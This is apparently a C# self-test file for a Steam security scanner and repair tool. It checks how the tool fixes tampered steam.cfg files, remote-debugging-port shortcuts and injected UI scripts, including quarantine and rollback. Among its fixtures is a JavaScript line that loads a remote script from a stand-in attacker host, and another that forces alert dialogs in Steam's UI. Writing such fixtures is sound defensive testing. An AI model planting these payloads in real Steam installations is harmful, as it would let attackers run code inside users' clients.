using System.Buffers.Binary;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using SteamSentinel.Broker;
using SteamSentinel.Core.Inspection;
using SteamSentinel.Core.Models;
using SteamSentinel.Core.Remediation;
using SteamSentinel.Core.Reporting;
using SteamSentinel.Core.Rules;
using SteamSentinel.Core.Scanning;
using SteamSentinel.Core.Steam;
using SteamSentinel.Core.Utilities;

namespace SteamSentinel.SelfTest;

internal static partial class Program
{
    private static async Task TestP2BSteamRecoveryAsync(string root)
    {
        string work = Path.Combine(root, "p2b-steam-recovery-" + Guid.NewGuid().ToString("N"));
        string steamRoot = Path.Combine(work, "Steam");
        string steamUiDir = Path.Combine(steamRoot, "steamui");
        string clientUiDir = Path.Combine(steamRoot, "clientui");
        Directory.CreateDirectory(steamUiDir);
        Directory.CreateDirectory(clientUiDir);
        string steamExe = Path.Combine(steamRoot, "steam.exe");
        byte[] fakeSteamExeBytes = "MZ_INERT_STEAM_FIXTURE"u8.ToArray();
        await File.WriteAllBytesAsync(steamExe, fakeSteamExeBytes);
        string fakeSteamExeHash = Convert.ToHexString(SHA256.HashData(fakeSteamExeBytes));
        SteamLayout layout = new();
        layout.SteamRoots.Add(steamRoot);

        // 1. GBK / ANSI 含中文注释的 steam.cfg 精确修复并逐字节保留非目标字节
        byte[] gbkCommentHeader = [0x23, 0x20, 0xD7, 0xA2, 0xCA, 0xCD, 0x0D, 0x0A]; // "# 注释\r\n" (GBK)
        byte[] gbkInhibitLine = [.. "BootStrapperInhibitAll=enable ; "u8.ToArray(), 0xBD, 0xFB, 0xD6, 0xB9, 0x0D, 0x0A]; // "; 禁止\r\n" (GBK)
        byte[] gbkForceLine = "BootStrapperForceSelfUpdate=0\r\n"u8.ToArray();
        byte[] gbkBenignLine = [.. "BenignSetting=1 ; "u8.ToArray(), 0xB1, 0xA3, 0xC1, 0xF4, 0x0D, 0x0A]; // "; 保留\r\n" (GBK)
        byte[] gbkOriginal = [.. gbkCommentHeader, .. gbkInhibitLine, .. gbkForceLine, .. gbkBenignLine];

        bool cfgRepairedOk = SteamConfigurationRepair.TryRepairCfg(gbkOriginal, out byte[] gbkRepaired, out bool cfgPaired);
        byte[] expectedInhibitSuffix = [.. " ; "u8.ToArray(), 0xBD, 0xFB, 0xD6, 0xB9, 0x0D, 0x0A];
        Check("P2-B 支持含GBK中文注释的steam.cfg精确修复、保持长度且逐字节保留中文注释",
            cfgRepairedOk && cfgPaired &&
            gbkRepaired.Length == gbkOriginal.Length &&
            gbkRepaired.AsSpan(0, gbkCommentHeader.Length).SequenceEqual(gbkCommentHeader) &&
            gbkRepaired.AsSpan(gbkCommentHeader.Length + "BootStrapperInhibitAll=enable".Length, expectedInhibitSuffix.Length).SequenceEqual(expectedInhibitSuffix) &&
            gbkRepaired.AsSpan(gbkOriginal.Length - gbkBenignLine.Length).SequenceEqual(gbkBenignLine) &&
            !SteamConfigurationRepair.TryRepairCfg(gbkRepaired, out _, out _));

        byte[] gbkBenignOnly = [.. gbkCommentHeader, .. gbkBenignLine];
        Check("P2-B 纯正常配置含GBK中文注释不误触发steam.cfg修复",
            !SteamConfigurationRepair.TryRepairCfg(gbkBenignOnly, out _, out _));

        // 2. --remote-debugging-port[= ]<port> 在命令行与 .lnk 快捷方式中的识别与清除
        string quotedCmdEquals = $"\"{steamExe}\" --remote-debugging-port=9222 -silent";
        bool cmdEqualsOk = SteamConfigurationRepair.TryRepairCommand(quotedCmdEquals, layout, out string repairedCmdEquals, out string resolvedExe1);
        Check("P2-B 命令行支持清除--remote-debugging-port=port并保留其他参数与长度",
            cmdEqualsOk && resolvedExe1.Equals(Path.GetFullPath(steamExe), StringComparison.OrdinalIgnoreCase) &&
            repairedCmdEquals.Length == quotedCmdEquals.Length &&
            !repairedCmdEquals.Contains("--remote-debugging-port", StringComparison.OrdinalIgnoreCase) &&
            repairedCmdEquals.TrimEnd().EndsWith("-silent", StringComparison.Ordinal) &&
            !SteamConfigurationRepair.TryRepairCommand(repairedCmdEquals, layout, out _, out _));

        string cmdSplitBoth = $"\"{steamExe}\" -cef-enable-debugging --remote-debugging-port 9223 -no-browser";
        bool cmdSplitOk = SteamConfigurationRepair.TryRepairCommand(cmdSplitBoth, layout, out string repairedCmdSplit, out _);
        Check("P2-B 命令行支持清除空格分隔--remote-debugging-port port及组合调试参数",
            cmdSplitOk && repairedCmdSplit.Length == cmdSplitBoth.Length &&
            !repairedCmdSplit.Contains("-cef-enable-debugging", StringComparison.OrdinalIgnoreCase) &&
            !repairedCmdSplit.Contains("--remote-debugging-port", StringComparison.OrdinalIgnoreCase) &&
            !repairedCmdSplit.Contains("9223", StringComparison.Ordinal) &&
            repairedCmdSplit.TrimEnd().EndsWith("-no-browser", StringComparison.Ordinal) &&
            !SteamConfigurationRepair.TryRepairCommand(repairedCmdSplit, layout, out _, out _));

        Check("P2-B 拒绝无合法数字端口的伪调试参数",
            !SteamConfigurationRepair.TryRepairCommand($"\"{steamExe}\" --remote-debugging-port=abc", layout, out _, out _) &&
            !SteamConfigurationRepair.TryRepairCommand($"\"{steamExe}\" --remote-debugging-port -silent", layout, out _, out _));

        byte[] lnkPortEquals = SteamConfigShortcutFixture(steamExe, "--remote-debugging-port=9333 -silent");
        byte[] lnkPortSpace = SteamConfigShortcutFixture(steamExe, "--remote-debugging-port 9334 -silent");
        Check("P2-B 快捷方式支持识别并无损清除--remote-debugging-port的两种写法",
            SteamConfigurationRepair.HasDebugShortcutArguments(lnkPortEquals) &&
            SteamConfigurationRepair.HasDebugShortcutArguments(lnkPortSpace) &&
            SteamConfigurationRepair.TryRepairShortcut(lnkPortEquals, layout, out byte[] lnkEqualsRepaired, out _) &&
            !SteamConfigurationRepair.HasDebugShortcutArguments(lnkEqualsRepaired) &&
            !SteamConfigurationRepair.TryRepairShortcut(lnkEqualsRepaired, layout, out _, out _) &&
            SteamConfigurationRepair.TryRepairShortcut(lnkPortSpace, layout, out byte[] lnkSpaceRepaired, out _) &&
            !SteamConfigurationRepair.HasDebugShortcutArguments(lnkSpaceRepaired));

        // 3. .lnk 常见无害展示块 0xA0000002 / 0xA0000004 / 0xA0000007 放行，危险重定向块继续拦截
        byte[] lnkBenignBlocks = AppendExtraDataBlock(
            AppendExtraDataBlock(
                AppendExtraDataBlock(lnkPortEquals, 0xA0000002u, 20),
                0xA0000004u, 12),
            0xA0000007u, 16);
        byte[] lnkEnvRedirect = AppendExtraDataBlock(lnkPortEquals, 0xA0000001u, 16);
        byte[] lnkDarwinRedirect = AppendExtraDataBlock(lnkPortEquals, 0xA0000006u, 16);
        Check("P2-B .lnk放行0xA0000002/04/07无害展示块且继续拦截Environment/Darwin重定向块",
            SteamConfigurationRepair.TryRepairShortcut(lnkBenignBlocks, layout, out _, out _) &&
            !SteamConfigurationRepair.TryRepairShortcut(lnkEnvRedirect, layout, out _, out _) &&
            !SteamConfigurationRepair.TryRepairShortcut(lnkDarwinRedirect, layout, out _, out _));

        // 4. UiFile 统一处置与可信回滚闭环
        string extPath = Path.Combine(steamUiDir, "external-injected.js");
        string extPayload = "const s = document.createElement('script'); s.src = 'https://evil.example.invalid/loader.js'; document.head.append(s);";
        await File.WriteAllTextAsync(extPath, extPayload);
        byte[] extOriginalBytes = await File.ReadAllBytesAsync(extPath);

        string tamperPath = Path.Combine(clientUiDir, "semantic-tampered.js");
        string tamperPayload = "function BMustShowSupportAlertDialog(){ return true; }\nfunction BHasActiveSupportAlerts(){ return true; }";
        await File.WriteAllTextAsync(tamperPath, tamperPayload);

        string dualPath = Path.Combine(steamUiDir, "dual-hit.js");
        await File.WriteAllTextAsync(dualPath, extPayload + "\n" + tamperPayload);

        RuleSet rules = RuleLoader.LoadEmbedded();
        ScanReport uiReport = new();
        await new SteamSecurityScanner(rules).ScanAsync(layout, uiReport);

        Finding? extFinding = uiReport.Findings.FirstOrDefault(f =>
            f.RuleId == "STEAM-UI-EXTERNAL-SCRIPT" &&
            f.Target.Equals(extPath, StringComparison.OrdinalIgnoreCase));
        Finding? tamperFinding = uiReport.Findings.FirstOrDefault(f =>
            f.RuleId == "STEAM-UI-SEMANTIC-TAMPERING" &&
            f.Target.Equals(tamperPath, StringComparison.OrdinalIgnoreCase));
        Finding[] dualFindings = uiReport.Findings.Where(f => f.Target.Equals(dualPath, StringComparison.OrdinalIgnoreCase)).ToArray();

        Check("P2-B 扫描将非官方外链与高置信度语义篡改UI脚本统一标记为UiFile配置修复",
            extFinding is { CanRemediate: true, ConfigurationKind: SteamConfigurationRepair.UiFile } &&
            extFinding.SuggestedActions.SequenceEqual([SuggestedActionKind.RepairSteamConfiguration]) &&
            tamperFinding is { CanRemediate: true, ConfigurationKind: SteamConfigurationRepair.UiFile } &&
            tamperFinding.SuggestedActions.SequenceEqual([SuggestedActionKind.RepairSteamConfiguration]) &&
            dualFindings.Length == 2);

        RemediationPlanBuilder builder = new(rules, layout);
        RemediationPlan mergedPlan = await builder.BuildAsync([extFinding!, tamperFinding!, .. dualFindings], false);
        Check("P2-B 同一UiFile多条命中自动去重合并且生成完整身份绑定动作",
            mergedPlan.Actions.Count == 3 &&
            mergedPlan.Actions.All(a =>
                a.Type == RemediationActionType.RepairSteamConfiguration &&
                a.ConfigurationKind == SteamConfigurationRepair.UiFile &&
                a.RepairedSha256 is null &&
                FileScopeSafety.IsValidIdentity(a.ExpectedFileIdentity) &&
                FileScopeSafety.IsValidIdentity(a.ExpectedParentIdentity)));

        Check("P2-B UiFile目标范围限制仅接受已知Steam目录下的steamui或clientui脚本资产",
            SteamConfigurationRepairTarget.IsFileTarget(extPath, SteamConfigurationRepair.UiFile, layout) &&
            SteamConfigurationRepairTarget.IsFileTarget(tamperPath, SteamConfigurationRepair.UiFile, layout) &&
            !SteamConfigurationRepairTarget.IsFileTarget(steamExe, SteamConfigurationRepair.UiFile, layout) &&
            !SteamConfigurationRepairTarget.IsFileTarget(Path.Combine(steamRoot, "steam.cfg"), SteamConfigurationRepair.UiFile, layout) &&
            !SteamConfigurationRepairTarget.IsFileTarget(Path.Combine(work, "outside", "steamui", "evil.js"), SteamConfigurationRepair.UiFile, layout));

        RemediationAction extAction = mergedPlan.Actions.Single(a => a.Target.Equals(extPath, StringComparison.OrdinalIgnoreCase));
        string backupPath = Path.Combine(work, "quarantine-ext.bak");
        QuarantineRecord uiRecord = await BrokerEngine.QuarantineSteamMarkerAsync(
            extAction, layout, backupPath, (_, _) => Task.CompletedTask, _ => { }, CancellationToken.None);

        Check("P2-B Broker对UiFile先完成备份再移除并能独立确认已移除",
            !File.Exists(extPath) &&
            File.Exists(backupPath) &&
            uiRecord.FileMutationAttempted &&
            uiRecord.ConfigurationKind == SteamConfigurationRepair.UiFile &&
            await SteamConfigurationRepairTarget.IsRepairedAsync(extAction, layout));

        await BrokerEngine.RestoreSteamMarkerAsync(uiRecord, layout, CancellationToken.None);
        await BrokerEngine.RestoreSteamMarkerAsync(uiRecord, layout, CancellationToken.None);
        Check("P2-B UiFile支持从受信备份可信回滚且二次回滚幂等",
            File.Exists(extPath) &&
            (await File.ReadAllBytesAsync(extPath)).SequenceEqual(extOriginalBytes) &&
            !await SteamConfigurationRepairTarget.IsRepairedAsync(extAction, layout));

        // 5. SteamRecoveryGuide 只读校验 + 双语引导 + 零写操作校验
        SteamRecoveryRecommendation signedGuide = SteamRecoveryGuide.Evaluate(layout, true,
            _ => new SignatureResult(SignatureStatus.Valid, (MessageText)"")
            {
                IsValveSigner = true,
                SignerSubject = "CN=Valve Corp., O=Valve Corp."
            });
        SteamRecoveryRecommendation untrustedGuide = SteamRecoveryGuide.Evaluate(layout, true,
            _ => new SignatureResult(SignatureStatus.Unsigned, (MessageText)""));

        RemediationBatchSession uiBatch = new() { ExecutionFinished = true };
        uiBatch.Plans.Add(mergedPlan);
        string zhGuidance;
        string enGuidance;
        using (DisplayText.UseCulture(DisplayText.Chinese))
            zhGuidance = SteamRecoveryGuide.BuildGuidance(layout, uiBatch, uiReport,
                _ => new SignatureResult(SignatureStatus.Valid, (MessageText)"") { IsValveSigner = true, SignerSubject = "CN=Valve Corp." });
        using (DisplayText.UseCulture(DisplayText.English))
            enGuidance = SteamRecoveryGuide.BuildGuidance(layout, uiBatch, uiReport,
                _ => new SignatureResult(SignatureStatus.Valid, (MessageText)"") { IsValveSigner = true, SignerSubject = "CN=Valve Corp." });

        string emptyGuidance = SteamRecoveryGuide.BuildGuidance(layout, new RemediationBatchSession(), new ScanReport());
        Check("P2-B SteamRecoveryGuide只读识别Valve签名分支、输出双语SteamSetup恢复引导且零修改磁盘",
            signedGuide.AllSteamExecutablesValveSigned &&
            !untrustedGuide.AllSteamExecutablesValveSigned &&
            signedGuide.GuidanceText != untrustedGuide.GuidanceText &&
            zhGuidance.Contains("Valve Authenticode", StringComparison.Ordinal) &&
            zhGuidance.Contains("SteamSetup.exe", StringComparison.Ordinal) &&
            enGuidance.Contains("Valve Authenticode", StringComparison.Ordinal) &&
            enGuidance.Contains("SteamSetup.exe", StringComparison.Ordinal) &&
            emptyGuidance.Length == 0 &&
            Convert.ToHexString(SHA256.HashData(await File.ReadAllBytesAsync(steamExe))) == fakeSteamExeHash);
    }

    private static byte[] AppendExtraDataBlock(byte[] baseShortcut, uint signature, int blockSize)
    {
        byte[] prefix = baseShortcut[..^4];
        byte[] result = new byte[prefix.Length + blockSize + 4];
        prefix.CopyTo(result, 0);
        BinaryPrimitives.WriteUInt32LittleEndian(result.AsSpan(prefix.Length, 4), (uint)blockSize);
        BinaryPrimitives.WriteUInt32LittleEndian(result.AsSpan(prefix.Length + 4, 4), signature);
        return result;
    }
}
